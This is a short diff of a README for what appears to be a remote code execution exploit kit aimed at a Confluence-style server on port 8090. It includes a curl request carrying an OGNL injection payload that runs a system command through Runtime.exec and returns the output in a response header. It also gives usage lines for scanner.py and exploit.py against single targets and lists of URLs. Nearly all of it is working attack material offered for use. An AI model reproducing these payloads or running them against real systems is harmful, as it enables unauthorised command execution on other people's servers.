@@ -15,7 +15,21 @@ or
 curl -v http://target_IP:8090/${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("X-Cmd-Response",Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("var d='';var i = java.lang.Runtime.getRuntime().exec('whoami').getInputStream(); while(i.available())d+=String.fromCharCode(i.read());d"))}/
 ```
  
- - Usage
- ```
+- Usage
+
+Exploit single target
+```
+python3 scanner.py -u http://xxxxx.com -c id
+```
+```
+python3 exploit.py https://target.com CMD
+```
+Exploit multi-targets
+```
+python3 scanner.py -f urls.txt -p -c id
+```
+<!--
+```
  python3 exploit.py https://target.com CMD
- ```
+```
+-->
